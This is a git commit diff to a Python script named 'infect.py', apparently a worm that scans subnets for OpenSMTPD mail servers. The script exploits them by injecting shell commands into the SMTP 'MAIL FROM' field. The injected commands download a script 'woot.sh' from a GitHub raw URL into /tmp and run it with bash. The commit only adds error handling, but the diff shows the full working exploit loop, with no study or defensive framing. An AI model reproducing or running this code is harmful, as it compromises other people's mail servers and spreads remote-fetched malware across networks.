beb64af0b6d0da9bb1b2da62c80e4a702e6f2792
presentdaypresenttime <o86ix@protonmail.com>
2022-04-02 00:07:14 +0300

    sneed

--- infect.py
+++ infect.py
@@ -40,43 +40,46 @@ for ADDR in find_subnets():
 		CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
 
 		for cmdnum in range(len(CMD)):
-			print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
-			s = socket(AF_INET, SOCK_STREAM)
-			s.connect((ADDR, PORT))
-			res = s.recv(1024)
-			if 'OpenSMTPD' not in str(res):
-				print('[!] No OpenSMTPD detected')
-				print('[!] Received {}'.format(str(res)))
-				print('[!] Exiting...')
-				sys.exit(1)
+			try:
+				print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
+				s = socket(AF_INET, SOCK_STREAM)
+				s.connect((ADDR, PORT))
+				res = s.recv(1024)
+				if 'OpenSMTPD' not in str(res):
+					print('[!] No OpenSMTPD detected')
+					print('[!] Received {}'.format(str(res)))
+					print('[!] Exiting...')
+					sys.exit(1)
 
-			print('[*] OpenSMTPD detected')
-			s.send(b'HELO x\r\n')
-			res = s.recv(1024)
-			if '250' not in str(res):
-				print('[!] Error connecting, expected 250')
-				print('[!] Received: {}'.format(str(res)))
-				print('[!] Exiting...')
-				sys.exit(1)
+				print('[*] OpenSMTPD detected')
+				s.send(b'HELO x\r\n')
+				res = s.recv(1024)
+				if '250' not in str(res):
+					print('[!] Error connecting, expected 250')
+					print('[!] Received: {}'.format(str(res)))
+					print('[!] Exiting...')
+					sys.exit(1)
 
-			print('[*] Connected, sending payload' + CMD[cmdnum])
-			s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
-			res = s.recv(1024)
-			if '250' not in str(res):
-				print('[!] Error sending payload, expected 250')
-				print('[!] Received: {}'.format(str(res)))
-				print('[!] Exiting...')
-				sys.exit(1)
+				print('[*] Connected, sending payload' + CMD[cmdnum])
+				s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
+				res = s.recv(1024)
+				if '250' not in str(res):
+					print('[!] Error sending payload, expected 250')
+					print('[!] Received: {}'.format(str(res)))
+					print('[!] Exiting...')
+					sys.exit(1)
 
-			print('[*] Payload sent')
-			s.send(b'RCPT TO:<root>\r\n')
-			s.recv(1024)
-			s.send(b'DATA\r\n')
-			s.recv(1024)
-			s.send(b'\r\nxxx\r\n.\r\n')
-			s.recv(1024)
-			s.send(b'QUIT\r\n')
-			s.recv(1024)
-			print('[*] Done')
-			time.sleep(3)
+				print('[*] Payload sent')
+				s.send(b'RCPT TO:<root>\r\n')
+				s.recv(1024)
+				s.send(b'DATA\r\n')
+				s.recv(1024)
+				s.send(b'\r\nxxx\r\n.\r\n')
+				s.recv(1024)
+				s.send(b'QUIT\r\n')
+				s.recv(1024)
+				print('[*] Done')
+				time.sleep(3)
+			except ConnectionRefusedError:
+				print("Connection error.")
 
